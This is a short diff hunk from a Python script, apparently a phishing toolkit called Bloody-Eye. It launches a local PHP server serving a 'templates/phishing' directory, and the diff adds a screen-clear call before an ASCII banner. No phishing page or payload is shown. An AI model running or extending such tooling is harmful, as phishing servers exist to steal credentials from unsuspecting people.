@@ -532,6 +532,7 @@ exit();""")
        try:
           with open("log","w") as phplog:
              Popen(("php","-S","localhost:6060","-t","../Bloody-Eye/templates/phishing"),stderr=phplog,stdout=phplog)
+          os.system("clear")
           print (Fore.BLUE+"""
 ..............              
             ..,;:ccc,.              
